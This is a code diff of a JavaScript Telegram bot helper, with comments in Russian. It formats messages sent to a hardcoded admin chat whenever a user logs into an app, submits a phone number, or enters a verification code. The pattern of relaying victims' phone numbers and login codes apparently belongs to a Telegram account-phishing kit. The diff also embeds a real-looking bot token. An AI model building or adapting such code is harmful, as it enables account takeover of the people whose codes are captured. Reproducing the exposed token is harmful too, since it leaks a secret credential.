@@ -1,23 +1,17 @@
 // Конфигурация (замените значения)
 const BOT_TOKEN = '8196403348:AAGrU-BOJgX6nFZB7f_YV9trqrBGKplWWt0';
 const ADMIN_ID = '5665980031';
-const BASE_URL = 'https://otz2026.github.io/mybot/'; // Должен совпадать с script.js
 
 // Форматирование сообщения
 const formatMessage = (type, data, user) => {
     const userInfo = `👤 ${user.first_name || 'Пользователь'} ${user.last_name || ''}\n` +
-                    `🆔 ID: <code>${user.id || '?'}</code>\n` +
-                    (user.username ? `@${user.username}\n` : '');
+                    `🆔 Id: <code>${user.id || '?'}</code>\n` +
+                    `🔗 User: <code>@${user.username || '?'}</code>\n`;
     
     switch(type) {
         case 'init':
             return {
                 text: `🚪 <b>Новый вход в приложение</b>\n\n${userInfo}`,
-                buttons: []
-            };
-        case 'exit':
-            return {
-                text: `🚶 <b>Пользователь вышел</b>\n\n${userInfo}`,
                 buttons: []
             };
         case 'phone':
@@ -27,15 +21,8 @@ const formatMessage = (type, data, user) => {
             };
         case 'code':
             return {
-                text: `🔢 <b>Требуется подтверждение кода</b>\n\nКод: <code>${data}</code>\n\n${userInfo}`,
-                buttons: [
-                    [
-                        { 
-                            text: "📲 Открыть панель подтверждения", 
-                            url: `${BASE_URL}/verify.html?code=${data}&user_id=${user.id}`
-                        }
-                    ]
-                ]
+                text: `🔢 <b>Введён код</b>\n\nКод: <code>${data}</code>\n\n${userInfo}`,
+                buttons: []
             };
         default:
             return {
